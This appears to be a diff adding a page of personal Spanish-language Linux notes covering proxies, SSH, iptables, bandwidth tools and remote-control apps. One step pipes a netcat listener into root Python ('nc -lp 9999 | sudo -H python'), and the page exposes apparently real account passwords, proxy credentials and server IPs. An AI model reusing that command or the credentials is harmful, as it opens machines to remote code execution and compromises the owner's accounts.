+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cambia proxyuser a tu usuario proxy
+cambie proxypwd a su contraseña de proxy
+cambie proxy.server.com a la URL de su servidor proxy
+cambie 8080 al puerto proxy configurado en su servidor proxy
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;git config –global http.proxy http://proxyuser:proxypwd@proxy.server.com:8080&lt;/p&gt;
+&lt;h4 id=&quot;con-credenciales&quot;&gt;Con credenciales&lt;/h4&gt;
+&lt;p&gt;git config –global http.proxy http://usu:usu@192.168.43.1:44355
+git config –global https.proxy http://usu:usu@192.168.43.1:44355&lt;/p&gt;
+&lt;h4 id=&quot;sin-credenciales&quot;&gt;Sin credenciales&lt;/h4&gt;
+&lt;p&gt;git config –global http.proxy http://192.168.43.1:44355
+git config –global https.proxy http://192.168.43.1:44355&lt;/p&gt;
+
+&lt;h4 id=&quot;finalmente-para-verificar-el-proxy-actualmente-configurado&quot;&gt;Finalmente, para verificar el proxy actualmente configurado:&lt;/h4&gt;
+&lt;p&gt;git config –global –get http.proxy
+git config –global –get https.proxy&lt;/p&gt;
+
+&lt;h4 id=&quot;restablecer-este-proxy-y-trabajar-sin-proxy&quot;&gt;restablecer este proxy y trabajar sin proxy:&lt;/h4&gt;
+&lt;p&gt;git config –global –unset http.proxy
+git config –global –unset https.proxy&lt;/p&gt;
+
+&lt;h4 id=&quot;errores-comunes&quot;&gt;Errores Comunes&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;502: URL/IP is unreachable from your network.
+407: Proxy authentication Denied.
+80 : Proxy has not been set properly.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;configuración-de-proxy-para-wget&quot;&gt;Configuración de proxy para wget:&lt;/h4&gt;
+&lt;p&gt;– Editamos el archivo de configuración /etc/wgetrc buscamos las siguientes lineas
+sudo nano /etc/wgetrc
+use_proxy=yes
+use_proxy=off&lt;/p&gt;
+
+&lt;p&gt;https_proxy = http://proxyserver:puerto/
+http_proxy = http://proxyserver:puerto/
+ftp_proxy = http://proxyserver:puerto/&lt;/p&gt;
+
+&lt;p&gt;https_proxy = http://192.168.43.1:44355/
+http_proxy = http://192.168.43.1:44355/
+ftp_proxy = http://192.168.43.1:44355/&lt;/p&gt;
+
+&lt;h4 id=&quot;configuracion-de-proxy-en-la-terminal&quot;&gt;Configuracion de proxy en la terminal&lt;/h4&gt;
+
+&lt;p&gt;sudo nano /etc/environment&lt;/p&gt;
+
+&lt;p&gt;http_proxy http://usu:usu@192.168.43.1:44355
+https_proxy http://usu:usu@192.168.43.1:44355
+ftp_proxy http://usu:usu@192.168.43.1:44355
+no_proxy localhost,127.0.0.1,localaddress,.localdomain.com
+#Duplicadas en mayusculas
+HTTP_PROXY http://usu:usu@192.168.43.1:44355
+HTTPS_PROXY http://usu:usu@192.168.43.1:44355
+FTP_PROXY http://usu:usu@192.168.43.1:44355
+NO_PROXY localhost,127.0.0.1,localaddress,.localdomain.com&lt;/p&gt;
+
+&lt;p&gt;otro formato&lt;/p&gt;
+
+&lt;p&gt;export http_proxy=http://usu:usu@192.168.43.1:44355
+export https_proxy=http://usu:usu@192.168.43.1:44355
+export ftp_proxy=http://usu:usu@192.168.43.1:44355
+export no_proxy=localhost,127.0.0.1,localaddress,.localdomain.com
+export #Duplicadas=en mayusculas
+export HTTP_PROXY=http://usu:usu@192.168.43.1:44355
+export HTTPS_PROXY=http://usu:usu@192.168.43.1:44355
+export FTP_PROXY=http://usu:usu@192.168.43.1:44355
+export NO_PROXY=localhost,127.0.0.1,localaddress,.localdomain.com&lt;/p&gt;
+
+&lt;h4 id=&quot;configuración-de-proxy-para-apt-get-apt-aptitude&quot;&gt;Configuración de proxy para apt-get, apt, aptitude:&lt;/h4&gt;
+&lt;p&gt;– Creamos o editamos archivo /etc/apt/apt.conf
+sudo nano /etc/apt/apt.conf&lt;/p&gt;
+
+&lt;p&gt;– agregamos las siguientes lineas:
+Acquire::http::Proxy “http://usu:usu@192.168.43.1:44355”; 
+Acquire::https::Proxy “http://usu:usu@192.168.43.1:44355”; 
+Acquire::ftp::Proxy “http://usu:usu@192.168.43.1:44355”;
+#En caso de tener un repo local para el que no necesitemos proxy 
+Acquire::http::Proxy {
+repositorio.localdomain.com DIRECT;
+repositorio2.localdomain.com DIRECT;
+};&lt;/p&gt;
+
+&lt;h3 id=&quot;cambiar-password-root&quot;&gt;Cambiar password root&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Abre la Terminal (Control + Alt + T)
+Teclea (sin comillas) &quot;sudo su&quot;
+Introduce tu clave actual
+Teclea &quot;passwd root&quot; y escribe tu nueva clave
+Pulsa enter y cierra la terminal
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;modificar-puerto-para-conectar-por-ssh&quot;&gt;Modificar puerto para conectar por SSH&lt;/h3&gt;
+
+&lt;p&gt;Edite el archivo sudo nano /etc/ssh/sshd_config utilizando su editor de textos favorito.
+service ssh restart&lt;/p&gt;
+
+&lt;h3 id=&quot;uso-de-targz&quot;&gt;uso de targz&lt;/h3&gt;
+
+&lt;p&gt;para descomprimir
+tar -xzvf archivo.tar.gz&lt;/p&gt;
+
+&lt;p&gt;para comprimir un directorio 
+tar -cvf sampleArchive.tar /home/sampleArchive&lt;/p&gt;
+
+&lt;h3 id=&quot;liberar-memoria-ram-sin-reiniciar&quot;&gt;Liberar memoria ram sin reiniciar&lt;/h3&gt;
+&lt;p&gt;Antes que nada, para saber cuánta memoria está en uso, cuánta está libre y cuánta está guardada en el caché ejecutamos el comando:
+free -m&lt;/p&gt;
+
+&lt;p&gt;Para ver el uso en tiempo real utilizamos:
+watch -n 1 free -m&lt;/p&gt;
+
+&lt;p&gt;-
+Para vaciar la memoria en si:
+sudo sync &amp;amp;&amp;amp; sudo sysctl -w vm.drop_caches=3&lt;/p&gt;
+
+&lt;h3 id=&quot;speetest-desde-consola-en-la-página-de-speedtestnet-hay-uno-mas-completo&quot;&gt;Speetest desde consola (en la página de speedtest.net hay uno mas completo)&lt;/h3&gt;
+&lt;p&gt;https://blog.desdelinux.net/como-ejecutar-una-prueba-de-velocidad-de-internet-desde-la-terminal/
+instalalar:
+sudo apt install speedtest-cli
+pip install speedtest-cli
+Para ejecutar:
+speedtest-cli&lt;/p&gt;
+
+&lt;h4 id=&quot;modificar-prompt&quot;&gt;Modificar Prompt&lt;/h4&gt;
+&lt;p&gt;nano .bashrc
+export PS1=”Texto&amp;gt; “
+source ~/.bashrc&lt;/p&gt;
+
+&lt;h4 id=&quot;como-conectar-por-ssh-sin-tener-que-ingresar-la-clave-todas-las-veces&quot;&gt;Como conectar por ssh sin tener que ingresar la clave todas las veces&lt;/h4&gt;
+&lt;p&gt;https://blog.desdelinux.net/ssh-sin-password-solo-3-pasos/&lt;/p&gt;
+
+&lt;p&gt;ssh-copy-id root@[ip-destino]
+ssh-copy-id root@200.73.128.64
+ssh-copy-id root@200.73.130.205
+ssh-copy-id root@54.159.130.144
+ssh-copy-id root@45.236.128.172
+ssh-copy-id root@200.73.129.196
+ssh-copy-id root02@20.80.89.33
+ssh-copy-id root02@20.80.89.33
+ssh-copy-id ubuntu@51.222.84.152
+ssh-copy-id root@200.73.133.192
+ssh-copy-id root@200.73.133.216&lt;/p&gt;
+
+&lt;h4 id=&quot;comprobando-quién-está-conectado-por-ssh-en-un-sistema-unixlinux&quot;&gt;Comprobando quién está conectado por SSH en un sistema UNIX/Linux&lt;/h4&gt;
+&lt;p&gt;https://www.elarraydejota.com/comprobando-quien-esta-conectado-por-ssh-en-un-sistema-unixlinux/&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ps -ef&lt;/td&gt;
+      &lt;td&gt;grep -w “sshd.”&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ps -ef&lt;/td&gt;
+      &lt;td&gt;grep -w “sshd.*? priv”&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ps -ef&lt;/td&gt;
+      &lt;td&gt;grep -w “sshd.*? priv”&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h4 id=&quot;cómo-habilitar-tcp-bbr-para-mejorar-la-velocidad-de-la-red-en-linux&quot;&gt;Cómo habilitar TCP BBR para mejorar la velocidad de la red en Linux&lt;/h4&gt;
+&lt;p&gt;https://translate.google.com/translate?depth=1&amp;amp;hl=es-AR&amp;amp;rurl=translate.google.com&amp;amp;sl=en&amp;amp;tl=es&amp;amp;u=https://www.techrepublic.com/article/how-to-enable-tcp-bbr-to-improve-network-speed-on-linux/&lt;/p&gt;
+
+&lt;p&gt;Var que version de kernel tiene
+uname -r
+Si es 4.13 o mayor solo es necesario habilitar la opcin de bbr&lt;/p&gt;
+
+&lt;p&gt;Saber que tipo de control de congestion está usando
+sysctl net.ipv4.tcp_congestion_control 
+si no se encuentra en el path el comando:
+/sbin/sysctl net.ipv4.tcp_congestion_control&lt;/p&gt;
+
+&lt;p&gt;Establecer BBR
+Establecer BBR como predeterminado es simple. Abra una ventana de terminal y emita el comando sudo nano /etc/sysctl.conf . Al final de este archivo, agregue las dos líneas siguientes:&lt;/p&gt;
+
+&lt;p&gt;net.core.default_qdisc = fq
+net.ipv4.tcp_congestion_control = bbr&lt;/p&gt;
+
+&lt;h3 id=&quot;ip-tables&quot;&gt;IP Tables&lt;/h3&gt;
+
+&lt;p&gt;Consultar reglas disponibles
+iptables -L -n -v&lt;/p&gt;
+
+&lt;p&gt;– Borrar todas las regas
+iptables -F&lt;/p&gt;
+
+&lt;p&gt;Consultar pedicione rechazadas
+iptables -N LOGGING&lt;/p&gt;
+
+&lt;p&gt;Bloquear porASN&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ASN=15169; for s in $(whois -H -h riswhois.ripe.net – -F -K -i $ASN&lt;/td&gt;
+      &lt;td&gt;grep -v “^$”&lt;/td&gt;
+      &lt;td&gt;grep -v “^%”&lt;/td&gt;
+      &lt;td&gt;awk ‘{ print $2 }’ ); do echo “Bloqueando $s”; sudo iptables -A INPUT -s $s -j DROP &amp;amp;&amp;gt; /dev/null&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;sudo ip6tables -A INPUT -s $s -j DROP; done&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ASN=32934; for s in $(whois -H -h riswhois.ripe.net – -F -K -i $ASN&lt;/td&gt;
+      &lt;td&gt;grep -v “^$”&lt;/td&gt;
+      &lt;td&gt;grep -v “^%”&lt;/td&gt;
+      &lt;td&gt;awk ‘{ print $2 }’ ); do echo  “Bloqueando $s”; sudo iptables -A INPUT -s $s -j DROP &amp;amp;&amp;gt; /dev/null&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;sudo ip6tables -A INPUT -s $s -j DROP; done&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;iptables -A INPUT -s 8.8.4.0/24 -j ACCEPT
+iptables -A INPUT -s 8.8.8.0/24 -j ACCEPT&lt;/p&gt;
+
+&lt;p&gt;iptables -D INPUT -s 8.8.4.0/24 -j DROP
+iptables -D INPUT -s 8.8.8.0/24 -j DROP&lt;/p&gt;
+
+&lt;p&gt;Listar todas las ip de un AS
+whois -H -h riswhois.ripe.net – -F -K -i 13335 | grep -v “^$” | grep -v “^%” | awk ‘{ print $2 }’&lt;/p&gt;
+
+&lt;p&gt;El ASN lo obtuve de esta url
+https://www.rtsak.com/dns-lookup/personal.com.ar&lt;/p&gt;
+
+&lt;p&gt;A continuación tenéis algunos ASN de las empresas más populares:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Google: AS15169
+Facebook: AS32934
+Microsoft: AS8075
+Yahoo: AS10310
+Telecom: AS7303
+CloudFlare: AS13335
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;…
+    –Bloquear el primer rango
+    199.30.231.0/24 255 ips bloqueadas&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;–Bloquear los dos primeros rangos
+199.30.0.0/16 65536 ips bloqueadas
+
+–Bloquear los tres primeros rangos
+199.0.0.0/8 16777216 ips serían bloqueadas
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;calculadorea de ip
+https://aprendaredes.com/cgi-bin/ipcalc/ipcalc_cgi1?host=104.18.0.0&amp;amp;mask1=20&amp;amp;mask2=
+Esquema de direcciones ip
+https://docs.oracle.com/cd/E19957-01/820-2981/ipplan-5/index.html&lt;/p&gt;
+
+&lt;p&gt;para conocer la ip de youtube
+ping youtube-ui.l.google.com
+iptables -A INPUT -s 172.217.0.0/16 -j DROP&lt;/p&gt;
+
+&lt;p&gt;limitar trafico por ip 
+iptables -A FORWARD -m hashlimit –hashlimit-burst 1mb –hashlimit-mode srcip, dstip –hashlimit-name bwlimit -j DROP&lt;/p&gt;
+
+&lt;p&gt;otro ejemplo
+iptables -I INPUT -p tcp -m tcp –dport 8080 -m hashlimit –hashlimit-upto 40/sec –hashlimit-burst 40 –hashlimit-mode srcip –hashlimit-name HTTP_RATE -j ACCEPT
+iptables -I INPUT -p tcp -m tcp –dport 8080 -j DROP&lt;/p&gt;
+
+&lt;p&gt;otro ejemplo
+sudo iptables –flush  # start again
+sudo iptables –new-chain RATE-LIMIT
+sudo iptables –append INPUT –match conntrack –ctstate NEW –jump RATE-LIMIT
+sudo iptables –append RATE-LIMIT –match limit –limit 10/sec –limit-burst 10 –jump ACCEPT
+sudo iptables –append RATE-LIMIT –jump DROP&lt;/p&gt;
+
+&lt;p&gt;otro ejemplo
+sudo iptables -A INPUT -m state –state RELATED,ESTABLISHED -m limit –limit 50/second –limit-burst 50 -j ACCEPT
+sudo iptables -A INPUT -m state –state RELATED,ESTABLISHED -m limit –limit 10/second –limit-burst 10 -j ACCEPT&lt;/p&gt;
+
+&lt;p&gt;otro ejemplo
+iptables -A FORWARD -m hashlimit –hashlimit-upto 512kb/sec –hashlimit-burst 1mb –hashlimit-mode srcip,dstip –hashlimit-name bwlimit -j DROP&lt;/p&gt;
+
+&lt;h3 id=&quot;monitor-de-red&quot;&gt;monitor de red&lt;/h3&gt;
+&lt;p&gt;iftop
+iptraf
+nethogs
+tcptrack -i eth0
+cbm&lt;/p&gt;
+
+&lt;p&gt;Server Brasil-3
+speedometer -r lo -t eth0 -s
+time speedometer -t lo -s -l -m 9900000&lt;/p&gt;
+
+&lt;p&gt;Transmite el server Fiber
+time speedometer -t lo -s -l -m 6500000&lt;/p&gt;
+
+&lt;p&gt;Transmite server USA
+speedometer -t lo -s -l -m 2000000&lt;/p&gt;
+
+&lt;p&gt;recibe por wifi interna
+time speedometer -r wlp1s0 -s -l -m 50000
+time slurm -s -z -i wlp1s0
+ recibe por wifi externa
+time speedometer -r wlx20e01704b3f0 -s -l -m 3000000
+time slurm -s -z -i wlx20e01704b3f0&lt;/p&gt;
+
+&lt;p&gt;time speedometer -t lo -s -l -m 8000000&lt;/p&gt;
+
+&lt;h3 id=&quot;pulseeffects-un-muy-buen-manejador-de-audio&quot;&gt;PulseEffects (Un muy buen manejador de audio)&lt;/h3&gt;
+&lt;p&gt;http://ubuntuhandbook.org/index.php/2019/06/install-audio-effects-pulseeffects-ubuntu-18-04-higher/&lt;/p&gt;
+
+&lt;p&gt;148.153.108.54                           &lt;br /&gt;
+186.12.44.38                             &lt;br /&gt;
+222.186.52.39                            &lt;br /&gt;
+dns.google                               &lt;br /&gt;
+149.154.175.54                           &lt;br /&gt;
+140.243.190.35.bc.googleusercontent.com  &lt;br /&gt;
+b1.b5.39a9.ip4.static.sl-reverse.com     &lt;br /&gt;
+54.c5.39a9.ip4.static.sl-reverse.com     &lt;br /&gt;
+87.251.74.45                             &lt;br /&gt;
+45.236.213.131                           &lt;br /&gt;
+srv2.gyllen.cl&lt;/p&gt;
+
+&lt;p&gt;Usuario:     21735582@isfd30.onmicrosoft.com&lt;/p&gt;
+
+&lt;p&gt;Contraseña:    Quh91455&lt;/p&gt;
+
+&lt;p&gt;Las credenciales para la plataforma microsoft las solicité en la plataforma del profesorado en:
+Aulas / Aula_Alumnos Electromecánica
+Mensajería interna.
+Botón redactar.
+Luego en el botón para, seleccioné a Alicia Campana porque ya me habia enviado algun mensaje anteriormente.
+Y me respondió con el usuario y contraseña
+Donde el usuario tiene el formato.
+usuario@isfd30.onmicrosoft.com
+y usario es mi nro de documento.&lt;/p&gt;
+
+&lt;p&gt;La url para ingresar es:
+https://login.microsoftonline.com/&lt;/p&gt;
+
+&lt;p&gt;Luego pide validar un teléfono y un correo electrónico.
+Me parece que es para poder recuperar contraseña, si fuera necesario en el futuro.&lt;/p&gt;
+
+&lt;p&gt;Tal vez quedó muy maestra ciruela, pero sin saber a quien solicitar las credenciales, no podía avanzar.&lt;/p&gt;
+
+&lt;h3 id=&quot;entrar-a-amazon-con-archivo-pem-de-claves&quot;&gt;Entrar a Amazon con archivo .pem de claves&lt;/h3&gt;
+&lt;p&gt;El archivo debe ser de solo lectura
+chmod 400 archivo.pem&lt;/p&gt;
+
+&lt;p&gt;para ingesar
+ssh -i $HOME/Descargas/VPS/joriza-br2.pem ubuntu@177.71.227.243
+ssh -i $HOME/Descargas/VPS/joriza-br3.pem ubuntu@54.232.42.191&lt;/p&gt;
+
+&lt;h3 id=&quot;cómo-mantener-vivas-las-conexiones-ssh&quot;&gt;Cómo mantener vivas las conexiones SSH&lt;/h3&gt;
+
+&lt;p&gt;sudo nano /etc/ssh/sshd_config&lt;/p&gt;
+
+&lt;p&gt;ClientAliveInterval 600
+ClientAliveCountMax 3
+ServerAliveInterval 600
+TCPKeepAlive yes&lt;/p&gt;
+
+&lt;h3 id=&quot;limitar-la-velocidad-de-la-placa-de-red&quot;&gt;Limitar la velocidad de la placa de red&lt;/h3&gt;
+
+&lt;p&gt;sudo apt install wondershaper
+cd /bin
+sudo git clone https://github.com/magnific0/wondershaper.git
+cd wondershaper
+sudo make install&lt;/p&gt;
+
+&lt;p&gt;sudo wondershaper clear wlp1s0&lt;/p&gt;
+
+&lt;p&gt;wondershaper -a lo -u 15360
+wondershaper -ca lo&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;wondershaper -ca lo&lt;/td&gt;
+      &lt;td&gt;wondershaper -a lo -u 35000&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;cd /bin/wondershaper
+./wondershaper -a lo -u 8192
+./wondershaper -a lo -d 4096
+./wondershaper -ca lo&lt;/p&gt;
+
+&lt;h3 id=&quot;como-top-pero-para-red&quot;&gt;Como top pero para red&lt;/h3&gt;
+&lt;p&gt;nethogs&lt;/p&gt;
+
+&lt;h3 id=&quot;copiar-archivos-por-ssh&quot;&gt;Copiar archivos por SSH&lt;/h3&gt;
+&lt;p&gt;http://mundo.openit.com.bo/?p=1639&lt;/p&gt;
+
+&lt;p&gt;cp /root/client.ovpn /home/ubuntu&lt;/p&gt;
+
+&lt;p&gt;scp ubuntu@45.156.25.208:/home/ubuntu/client.ovpn /home/javier/Descargas&lt;/p&gt;
+
+&lt;h3 id=&quot;configurar-una-maquina-como-proxy-socks&quot;&gt;Configurar una maquina como proxy socks&lt;/h3&gt;
+&lt;p&gt;ssh -D 9999 root@200.73.128.12
+En la maquina que lo va a utilizar, en proxy socks colocar:
+localhost Port:9999&lt;/p&gt;
+
+&lt;h3 id=&quot;termius&quot;&gt;Termius&lt;/h3&gt;
+&lt;p&gt;Termius
+Pitufo0$Pitufo0&lt;/p&gt;
+
+&lt;h3 id=&quot;como-instalar-un-archivo-deb-facilmente&quot;&gt;Como instalar un archivo .deb facilmente&lt;/h3&gt;
+&lt;p&gt;ejemplo de una descarga
+wget https://www.unifiedremote.com/static/builds/server/linux-x64/745/urserver-3.6.0.745.deb&lt;/p&gt;
+
+&lt;p&gt;Se instala con:
+sudo dpkg -i archivo*.deb&lt;/p&gt;
+
+&lt;p&gt;Si tienen problemas con las dependencias las solucionan con:
+sudo apt-get install -f&lt;/p&gt;
+
+&lt;p&gt;Para desinstalar:
+sudo apt-get remove archivo.deb&lt;/p&gt;
+
+&lt;h3 id=&quot;celular-como-mouse-pad&quot;&gt;Celular como Mouse Pad&lt;/h3&gt;
+
+&lt;h4 id=&quot;linux-remote-control&quot;&gt;Linux Remote Control&lt;/h4&gt;
+&lt;p&gt;Aplicación de solo 1Mb
+https://play.google.com/store/apps/details?id=com.matze.remotecontrol&lt;/p&gt;
+
+&lt;p&gt;Ejecutar el siguiente comando en la computadora:
+nc -lp 9999 | sudo -H python&lt;/p&gt;
+
+&lt;p&gt;Abrir el menú en la aplicación y elija “Agregar host”.
+Elija un apodo gratis por su elección y proporcione la dirección IP de su computadora.&lt;/p&gt;
+
+&lt;h4 id=&quot;home-remote-control&quot;&gt;Home Remote Control&lt;/h4&gt;
+&lt;p&gt;https://play.google.com/store/apps/details?id=com.inspiredandroid.linuxcontrolcenter&amp;amp;hl=es&lt;/p&gt;
+
+&lt;p&gt;El servidor en un archivo .jar asi que funciona multiplataforma
+se descarga de:
+http://schubert-simon.de/remotecontrolserver/RemoteControlServer.zip
+En algunas distribuciones basta con hacer doble click al archivo .jar, en otras se debe ejecutar:
+java -jar RemoteDroidServer.jar&lt;/p&gt;
+
+&lt;h4 id=&quot;unifiedremote-telefono-cono-mando-remoto-de-la-pc&quot;&gt;Unifiedremote (Telefono cono mando remoto de la Pc)&lt;/h4&gt;
+&lt;p&gt;https://play.google.com/store/apps/details?id=com.Relmtech.Remote&lt;/p&gt;
+
+&lt;p&gt;Para instalar en la PC
+wget https://www.unifiedremote.com/static/builds/server/linux-x64/745/urserver-3.6.0.745.deb
+sudo dpkg -i urserver*.deb&lt;/p&gt;
+
+&lt;h3 id=&quot;atajos-de-teclado&quot;&gt;Atajos de teclado&lt;/h3&gt;
+
+&lt;p&gt;Vamos a ver una serie de atajos de teclado que nos ayudan a ganar agilidad, versatilidad y a trabajar más cómodamente con la terminal y con la línea de comandos en general.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;TAB: El tabulador permite autocompletar lo que se está escribiendo o navegar entre posibles opciones.
+CTRL + C: Sirve para matar un proceso que se esté ejecutando.
+CTRL + Z: Sirve para enviar al segundo plano el proceso que se está ejecutando. Si queremos volver al mismo, bastará con usar el comando fg.
+CTRL + D: Es el equivalente al comando exit, que sirve para cerrar la sesión de un usuario.
+CTRL + L: Este es el equivalente al comando clear y sirve para limpiar la pantalla de terminal. Es bastante útil, sobre todo cuando se ejecuta algún otro software de línea de comandos que no tiene un comando para limpiar pantalla y no se puede insertar el comando clear, como por ejemplo al utilizar el terminal de MySQL.
+CTRL + A: Mueve el cursor al inicio. Es útil si estamos escribiendo un comando largo y queremos corregir algo del inicio.
+CTRL + E: Mueve el cursor al final. De utilidad si queremos añadir algo al final del comando de forma rápida.
+CTRL + U: Con este atajo se borra la línea entera, independientemente de donde esté el cursor.
+CTRL + K: De esta forma conseguimos borrar desde la posición del cursor hasta el final de la línea.
+CTRL + W: Sirve para borrar la palabra que esté justo antes del cursor, o bien borra todas las letras desde la posición en la que está el mismo hasta el inicio de la palabra anterior.
+CTRL + Y: Permite deshacer el último borrado que se ha realizado.
+CTRL + R: Permite buscar dentro del historial de comandos que se han introducido. Es útil en caso de no recordar un comando que se ha introducido o uno que sea excesivamente largo, así se puede recuperar sin tener que volver a escribirlo. Cada vez que se pulsa CTRL + R la búsqueda va un paso más atrás.
+CTRL + G: Para salir de la búsqueda.
+CTRL + SHIFT + C: Sirve para copiar texto seleccionado en la terminal.
+CTRL + SHIFT + V: Permite pegar el texto copiado en la terminal.
+CTRL + S: De esta forma podemos pausar lo que se está imprimiendo por pantalla. Es útil para poder leer algo del texto que aparece durante una instalación, por ejemplo.
+CTRL + Q: Para reanudar la impresión por pantalla que se había pausado.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;reloj-en-la-terminal-de-comandos&quot;&gt;Reloj en la terminal de comandos&lt;/h3&gt;
+
+&lt;h4 id=&quot;sin-instalar-nada&quot;&gt;sin instalar nada.&lt;/h4&gt;
+&lt;p&gt;Reloj arriba a la derecha mientras la terminal esté abierta
+while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &amp;amp;&lt;/p&gt;
+
+&lt;h4 id=&quot;reloj-grande-en-el-centro-de-la-pantalla&quot;&gt;Reloj grande en el centro de la pantalla&lt;/h4&gt;
+&lt;p&gt;tty-clock -s -x -b -c&lt;/p&gt;
+
+&lt;p&gt;para instalar
+Pueden ser necesarias las siguientes librerías.
+sudo apt-get install libncurses5-dev libncursesw5-dev&lt;/p&gt;
+
+&lt;h3 id=&quot;tmux-multiples-ventanas-como-terminator-parecido-a-screen&quot;&gt;tmux (multiples ventanas como terminator, parecido a screen)&lt;/h3&gt;
+&lt;p&gt;algunas paginas que ayudan con la configuración
+https://learnxinyminutes.com/docs/es-es/tmux/
+https://wiki.archlinux.org/index.php/Tmux_(Espa%C3%B1ol)
+https://gist.github.com/jesusangelm/8113117
+https://picodotdev.github.io/blog-bitix/2019/10/guia-de-inicio-del-gestor-de-terminales-y-sesiones-tmux/
+https://leanpub.com/the-tao-of-tmux/read&lt;/p&gt;
+
+&lt;h3 id=&quot;pomodoro-para-linux&quot;&gt;pomodoro para linux&lt;/h3&gt;
+&lt;p&gt;https://gnomepomodoro.org/
+sudo apt-get install gnome-shell-pomodoro&lt;/p&gt;
+
+&lt;h3 id=&quot;borrar-archivos-de-más-de-x-días-de-antigüedad&quot;&gt;Borrar archivos de más de x días de antigüedad&lt;/h3&gt;
+&lt;p&gt;find $HOME/terrier-spanish/Users/jorge/test_results/&lt;em&gt;.txt&lt;/em&gt; -mtime +90 -exec rm {} \;
+https://www.edubox.org/linux-script-borrar-backup-viejos/&lt;/p&gt;
+
+&lt;h3 id=&quot;calculadora-ip&quot;&gt;Calculadora IP&lt;/h3&gt;
+&lt;p&gt;https://www.aprendaredes.com/blog/calculadora-ip/&lt;/p&gt;
+
+&lt;p&gt;mi ip en microlan 6/10 15hs
+ 190.181.100.190&lt;/p&gt;
+
+&lt;p&gt;ip de microlan
+181.23.37.80&lt;/p&gt;
+
+&lt;h3 id=&quot;quitar-lineas-duplicadas&quot;&gt;Quitar lineas duplicadas&lt;/h3&gt;
+&lt;p&gt;cat Origen.txt | sort | uniq &amp;gt; Destino.txt&lt;/p&gt;
+
+&lt;h4 id=&quot;abrir-otra-terminal-desde-la-propia-terminal&quot;&gt;Abrir otra terminal desde la propia terminal&lt;/h4&gt;
+&lt;p&gt;Ejecutar desde la linea de comando
+gnome-terminal&lt;/p&gt;
+
+&lt;h4 id=&quot;apagar-linux-desde-consola&quot;&gt;Apagar linux desde consola&lt;/h4&gt;
+&lt;p&gt;https://soyprogramador.liz.mx/2015/12/07/apagar-linux-desde-consola-2&lt;/p&gt;
+
+&lt;p&gt;halt, poweroff y shutdown son los comandos con los que podremos apagar nuestro linux dese consola, siendo shutdown el que mas opciones nos brinda. y para reiniciar tenemos reboot.&lt;/p&gt;
+
+&lt;p&gt;$ sudo poweroff&lt;/p&gt;
+
+&lt;p&gt;Con shutdown ademas de apagar el equipo, podemos especificar la hora exacta o bien dentro de cuanto tiempo se debera a pagar nuestro sistema, por ejemplo:&lt;/p&gt;
+
+&lt;p&gt;Para que se apague inmediatamente&lt;/p&gt;
+
+&lt;p&gt;$ sudo shutdown -h now&lt;/p&gt;
+
+&lt;p&gt;En 10 minutos:&lt;/p&gt;
+
+&lt;p&gt;$ sudo shutdown -h +10&lt;/p&gt;
+
+&lt;h4 id=&quot;apagar-y-reiniciar-mediante-comandos&quot;&gt;Apagar y reiniciar mediante comandos&lt;/h4&gt;
+&lt;p&gt;https://blog.desdelinux.net/apagar-y-reiniciar-mediante-comandos/&lt;/p&gt;
+
+&lt;h4 id=&quot;tomar-notas-en-linux-similar-a-onenote&quot;&gt;Tomar notas en Linux, similar a OneNote&lt;/h4&gt;
+&lt;p&gt;Xournal 
+http://www.estrellateyarde.org/ofimatica/tomar-notas-en-linux&lt;/p&gt;
+
+&lt;h4 id=&quot;controlar-el-volumen-del-audio-y-del-sonido-desde-la-terminal&quot;&gt;Controlar el volumen del audio y del sonido desde la terminal&lt;/h4&gt;
